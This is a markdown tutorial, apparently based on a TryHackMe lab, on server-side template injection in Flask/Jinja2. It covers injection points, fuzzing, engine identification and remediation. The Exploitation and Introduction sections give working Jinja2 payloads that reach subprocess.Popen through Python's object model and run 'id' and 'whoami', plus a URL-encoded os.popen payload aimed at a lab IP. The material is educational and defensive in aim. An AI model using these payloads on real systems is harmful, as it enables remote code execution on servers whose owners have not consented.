# SSTI

<img width="1902" height="424" alt="image" src="https://github.com/user-attachments/assets/a5655664-89d3-4e45-84f5-974cab17e0fe" />



<details>
  <summary>Introduction</summary>


✅ **What is Server-Side Template Injection (SSTI)?**
====================================================

**SSTI = Server Side Template Injection**\
This means: An exploit that occurs when the developer writes a template incorrectly, allowing the attacker to inject code into the template and execute it on the server.

* * * * *


🎨 **What is a template engine?**
=================================

Template Engine = template engine\
His job: Creates an HTML page with static parts + dynamic parts.

example:

- Fixed: Page layout

- Dynamic: username, content, data

Among the most famous engines:

- **Jinja2** (Python/Flask)

- **Twig** (PHP)

- **Freemarker** (Java)

- **Mustache**

- **Velocity**

* * * * *

🔥 Simplified example (Flask + Jinja2)
=============================

Code:

```python
@app.route("/profile/<user>")
def profile_page(user):
    template = f"<h1>Welcome to the profile of {user}!</h1>"
    return render_template_string(template)
```

The problem here:

❌ The user input is placed directly inside the template\
Instead of following as data.

* * * * *

😈 **How ​​is SSTI exploited?**
=========================================

Because the template engine interprets any syntax of its own...

If you wrote:

`/profile/{{7*7}}`

Jinja2 will evaluate
And you will see on the page:

`Welcome to the profile of 49!`

This is confirmation that there is an SSTI.

* * * * *

💥 **What is the effect of SSTI?**
========================

The effect is very serious:

✔ **Executes code on the server (RCE)**\
✔ You can read files\
✔ View users\
✔ Privilege escalation works

RCE example in Jinja2:

`{{ [].__class__.__mro__[2].__subclasses__()[40]("id", shell=True, stdout=-1).communicate()[0] }}`

And this comes back:

`uid=33(www-data) gid=33(www-data)`

It means you took control of the server.

* * * * *

🧨 The difference between SSTI and XSS?
========================

| Attack type | Implementation | Its danger
| --- | --- | --- |
| **XSS** | In the browser---client side | Dangerous but limited (theft of sessions, etc.)
| **SSTI** | On **server** | Very dangerous --- connect to RCE |

SSTI = pure other level 🧨🔥



<img width="833" height="164" alt="image" src="https://github.com/user-attachments/assets/84eb4524-1124-4cf4-8dc2-c51e001e8906" />


<img width="832" height="161" alt="image" src="https://github.com/user-attachments/assets/a0123d2c-e2a6-474e-b6e4-70672bbf1ce6" />




  
</details>


<details>
  <summary>Detection</summary>


✅ **1) Finding an Injection Point --- Injection Point**
================================================

Before you can use SSTI, you must find a place in the application where you can inject code.

Possible places:

-URL

- Input fields

-Hidden fields

- Headers (sometimes)

-Cookies

In our example:\
The site has an endpoint:

`http://10.10.137.155:5000/profile/<user>`

Meaning `<user>` = input from user\
This is a clear injection point.

For example, when you try:

`/profile/ali`

You will find the page saying:

`Welcome to the profile of ali!`

Okay... That's how we know where to inject.

* * * * *


🔥 **2) Fuzzing --- Input testing process **
==========================================

**fuzzing goal**:\
We will see if our input is interpreted as a template on the server or just plain text.

* * * * *

✳️ How do we fuzz?
--------------

You are trying to send special codes used by Template Engines.

Most popular symbols:

`${{<%[%'"}}%`

Why these symbols?\
Because most template engines (Jinja2 -- Twig -- Freemarker -- Velocity...) use it in their syntax.

* * * * *

✳️ Manual Fuzzing method
-----------------------------------

Let's try the code after the second:

example:

```
/profile/${
/profile/{
/profile/{{
/profile/<
/profile/%
...
````

You will notice **the result on the page**.

💡 We are looking for two things:

### ✔ 1) Error appears

This usually means that the template engine tried to interpret the code and fell → **strong indicator of SSTI**.

### ✔ 2) Symbols disappear from the output

It means that the template said, “This is my part,” and started interpreting the syntax.\
This also = **SSTI is present**.

* * * * *

Quick example:
----------

If you wrote:

`/profile/{{7*7}}`

If the page is returned:

`Welcome to the profile of 49!`

This is 100% confirmation that there is **Server-Side Template Injection** because the calculation was done on the server.



<img width="1299" height="223" alt="image" src="https://github.com/user-attachments/assets/4a7e24f0-7f7c-4d95-885a-272762683a19" />








  
</details>













<details>
  <summary>Identification</summary>


After I realized that there was **SSTI** due to the appearance of an error or a change in the output, the next step is to **know the type of template engine** so that you can write the correct payloads.

💡 First step: Look at the Error Message
----------------------------------

If the name of the engine (such as Jinja2, Twig, Freemarker) appears in the error, then you are finished.

But if **there is no obvious error**... we go to the **Decision Tree**.

* * * * *



![image](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png)


⭐ How do we follow the Decision Tree?
==============================

The decision tree is simply a collection of small questions and experiments to determine the type of template engine.

The whole idea is that you:

### ✔ 1. Start from the north (first test)

You put something like this in the parameter:

`${7*7}`

or

`{{7*7}}`

### ✔ 2. Monitors response:

➤ **If the server returns the result 49 → follow the green arrow (Evaluated)**
-----------------------------------------------------------------

This means that the server performed the calculation.

➤ **If the same text you wrote comes back ${7*7} → it goes with the red arrow (Reflected)**
--------------------------------------------------------------------------

This means that the server did not understand that it was a mathematical operation.

* * * * *

⭐ Examples 
===============

### **First step:** You typed `${username}`

And the server returned the same words → we keep walking in the **red arrow**.

### **The next step:** I wrote `${7*7}`

And the server returned 49 → we keep walking at **green arrow**.

And so on... you continue until you reach the type of engine:

-Jinja2

- Twig

-Freemarker

- Velocity

- Mustache\
    ...etc.

* * * * *

⭐ Why do we do this?
================

Because each template engine uses different **Syntax** and **gadgets** in the exploit.\
When you specify the type, you will know how to write RCE payload correctly.


<img width="896" height="167" alt="image" src="https://github.com/user-attachments/assets/db0f776c-0cf6-40e4-af2a-6d70026d9719" />


<img width="916" height="169" alt="image" src="https://github.com/user-attachments/assets/568a6dcc-cd4c-4957-baf8-ff03f87eb4b5" />


**2) Test `{{ 7*'7' }}` → return "7" repeated 7 times**
----------------------------------------------------

This is very, very important!

### ✔ In **Jinja2**:

Multiply string by a number → repeat\
Meaning:

`{{ 7 * '7' }} → '7777777'`

This is what I saw.

### ✘ In **Twig**:

Twig considers this **operation invalid** and often throws an error\
Because Twig is *strict* with types and does not do string multiplication like Jinja.


  
</details>





<details>
  <summary>Syntax</summary>


✅ **After you determine the Template Engine... you must know its Syntax**
===================================================================

for him?\
Because any SSTI exploit depends on *how you write codes inside the template* in the way that the engine understands.

Each Template Engine has “delimiters” with which it specifies:

- **Print statement** → Things get printed

- **Block statement** → Codes and logical implementation (loops, if, ...)

* * * * *

🎯 **In this example (Jinja2):**
=============================

### ✔ **Print Statement**

The need that is printed:

`{{ expression }}`

- `{{` → start print

- `}}` → end print

example:

`{{ 2+5 }} → 7`

* * * * *

### ✔ **Block Statement**

Logical commands (if, for, macro, ...):

`{% statement %}`

- `{%` → start block

- `%}` → end block

example:

`{% if 1 == 1 %}
Hello
{%endif%}`

* * * * *

🧠 **Why is this important in SSTI?**
=================================

Because:

- If you write payload incorrectly → it will not be executed

- You must write any exploit inside the syntax form that the engine understands

example:

`{{ 7*7 }} → runs out and comes out 49`

If you wrote it like this:

`{ 7*7 }`

It will not be implemented → just text.

* * * * *


⭐ **Very quick summary**
==========================

| Statement type | beginning | end | Example |
| --- | --- | --- | --- |
| Print | `{{` | `}}` | `{{ 1+2 }}` |
| Block | `{%` | `%}` | `{% for i in range(5) %}` |



## [documentation](https://jinja.palletsprojects.com/en/stable/)


<img width="1101" height="330" alt="image" src="https://github.com/user-attachments/assets/2c67c949-d713-4196-a6a1-d769d9c449a3" />


<img width="1045" height="249" alt="image" src="https://github.com/user-attachments/assets/6668ad4b-bd6f-42db-8893-1d4d75ac3758" />



  
</details>







<details>
  <summary>Exploitation</summary>

✅ **Where have we reached?**
=========================

- We knew that it had **SSTI**

- We found **Injection Point**

- We knew **Template Engine = Jinja2**

We knew **his Syntax**

Now is the time for exploitation 💣🔥

* * * * *

🎯 **General plan**
===================

Jinja2 = Python\
Therefore, our goal is:
**Run Python code → Run system commands → RCE**

The problem?\
Jinja2 **does not allow import** inside the template.

This means payload like:

`{% import os %}
{{ os.system("whoami") }}`

❌ **It will not work**

So what should we do?\
We use **Python Object Inheritance + subclasses** to access the RCE object we have.

* * * * *


🚀 **Steps to exploit Jinja2 to access RCE**
=========================================

**1️⃣ We get the class for string empty**
-----------------------------------

`{{ ''.__class__ }}`

This is in our hands `<class 'str'>`

* * * * *

**2️⃣ We go up in the inheritance using **mro****
-----------------------------------------------------

`{{ ''.__class__.__mro__ }}`

This is in your hands a tuple with an inheritance chain

* * * * *

**3️⃣ We take the base object class**
----------------------------------

`{{ ''.__class__.__mro__[1] }}`

This is often `<class 'object'>`

* * * * *


**4️⃣ We go down the tree using **subclasses**()**
----------------------------------------------------

`{{ ''.__class__.__mro__[1].__subclasses__() }}`

This returns **list of all the classes you inherited**

Among them:

-subprocess.Popen

- file loaders

-exception handlers

-And others...

* * * * *

**5️⃣ We find the index of subprocess.Popen**
-----------------------------------------

Usually you search with Ctrl+F:\
revolve around the word:

`Popen`

I found it --- like the example --- in index number 401.

* * * * *


**6️⃣ We use it to execute orders**
----------------------------

`{{ ''.__class__.__mro__[1].__subclasses__()[401]("whoami", shell=True, stdout=-1).communicate() }}`

🔥 Congratulations --- RCE on the server ✨

* * * * *

🎯 **Why is this on?**
===================

because:

- Jinja2 gives you access to the Python object model

- Python classes have an inheritance tree

- We can find the father of all beings → object

- We go down to each sub-classes → subprocess

- subprocess.Popen = run commands

- communicate() = output

* * * * *

⚡ **Very quick summary to remember**
===========================

| stage | target | Example |
| --- | --- | --- |
| 1 | Naguib class | `''.__class__` |
| 2 | We go to object | `.__mro__[1]` |
| 3 | We go down to each subclasses | `.__subclasses__()` |
| 4 | Najeeb subprocess.Popen | `[index]` |
| 5 | We run the | command `("whoami", shell=True)...` |















```
http://10.10.137.155:5000/profile/%7B%7B%20self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()%20%7D%7D
```

<img width="1462" height="227" alt="image" src="https://github.com/user-attachments/assets/a9b7a73d-93ec-46c0-a4cf-af17a021cc78" />



## [document for SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)

  
</details>






<details>
  <summary>Examination</summary>

🔥 **The idea is very simple**
=========================

The code in Flask does a very simple thing:

❗ It takes the user input → and puts it inside template → and gives this template to render_template_string()

**Jinja2** detects anything between:

`{{ }}
{% %}`

**Rate it as code**.

This is the reason for exploitation.

* * * * *

👇 Let's see the topic step by step
===============================

**1️⃣ Code before any exploitation**
----------------------------

`template = f"<h1>Welcome to the profile of {user}!</h1>"`

If you wrote:

`/profile/Ahmed`

The template that will be executed remains:

`<h1>Welcome to the profile of Ahmed!</h1>`

Okay.

* * * * *

**2️⃣ When we entered string normally**
=============================

`TryHackMe`

The code remains:

`<h1>Welcome to the profile of TryHackMe!</h1>`

normal.

* * * * *

**3️⃣ When we entered payload like:**
==============================

`{{ 7 * 7 }}`

The code that will be evaluated is:

`template = f"<h1>Welcome to the profile of {{ 7 * 7 }}!</h1>"`

When Jinja2 saw:

`{{ 7 * 7 }}`

He said:\
“This is a print expression → I have to implement it as Python-style code.”

So he executed:

`7 * 7 → 49`

Hence:

The final template returned to the browser:

`<h1>Welcome to the profile of 49!</h1>`











  
</details>











<details>
  <summary>Remediation</summary>


🛡️ **Methods of protection from Server-Side Template Injection**
-----------------------------------------------------

### 1\. **Use Passing data, not concatenation**

- **Danger:** When the user value is inserted directly into the code (string concatenation) like this:

    `template = f"<h1>Welcome to the profile of {user}!</h1>"
    return render_template_string(template)`

- **Safe solution:** Let the user input treat it as **data inside the template** and not as code:

    `template = "<h1>Welcome to the profile of {{ user }}!</h1>"
    return render_template_string(template, user=user)`

- This allows Jinja2 to consider `user` as just a regular value and not an executed code.

* * * * *



### 2\. **Sanitization of user data**

- You must prevent the presence of any symbols or letters that can be exploited in the template.

- Example in Python using regex to ensure that the value entered by the user is only numbers and letters:

    `import re
    # Leave only the letters and numbers present, delete the rest
    user = re.sub("[^A-Za-z0-9]", "", user)
    template = "<h1>Welcome to the profile of {{ user }}!</h1>"
    return render_template_string(template, user=user)`

- This is a way to reduce the risks if there is any attempt to enter a code.

* * * * *


### 3\. **Read the Template Engine documentation**

- Each template engine has security features and settings that help you protect your application.

- Therefore, you must know well how to write templates in a safe way and take advantage of the protection tools that the engine offers.

* * * * *


Conclusion:
--------

- **Do not concatenate user data directly with the code!**

- **Use the context variables feature in the template.**

- **Clean user data before you use it.**

- **Learn and follow the documentation for the template engine you use.**





  
</details>





















